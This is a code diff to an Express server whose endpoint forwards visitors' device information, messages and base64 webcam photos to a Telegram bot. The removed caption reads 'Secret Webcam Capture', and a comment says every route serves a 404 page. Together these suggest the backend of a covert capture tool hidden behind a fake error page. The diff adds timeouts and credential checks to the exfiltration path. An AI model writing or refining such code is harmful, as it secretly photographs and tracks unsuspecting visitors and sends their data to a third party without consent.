@@ -4,51 +4,55 @@ const express = require('express');
 const path = require('path');
 const axios = require('axios');
 const FormData = require('form-data');
-const geoip = require('geoip-lite');
-const cors = require('cors');
-
 const app = express();
 const port = process.env.PORT || 3000;
 
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json({ limit: '50mb' }));
-app.use(cors());
+app.use(express.urlencoded({ extended: true }));
 
+// Enhanced Telegram sender with error handling
 app.post('/send-to-telegram', async (req, res) => {
   try {
     const { deviceInfo, message, photoData } = req.body;
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    // First send the text message
+    if (!botToken || !chatId) {
+      throw new Error('Telegram credentials not configured');
+    }
+
+    // Send text message
     await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
       parse_mode: 'Markdown',
       disable_web_page_preview: true
-    });
+    }, { timeout: 5000 });
 
-    // If photo exists, send it
-    if (photoData) {
+    // Send photo if available
+    if (photoData && photoData.startsWith('data:image')) {
       const form = new FormData();
       form.append('chat_id', chatId);
-      form.append('photo', Buffer.from(photoData.split(',')[1], 'base64', {
+      form.append('photo', Buffer.from(photoData.split(',')[1], 'base64'), {
         filename: 'capture.jpg'
       });
-      form.append('caption', '📸 Secret Webcam Capture');
+      form.append('caption', '📸 Webcam Capture');
 
       await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
-        headers: form.getHeaders()
+        headers: form.getHeaders(),
+        timeout: 10000
       });
     }
 
     res.status(200).send('OK');
   } catch (error) {
-    console.error('Telegram error:', error);
+    console.error('Telegram error:', error.message);
     res.status(500).send('Error');
   }
 });
 
+// Serve only the 404 page for all routes
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
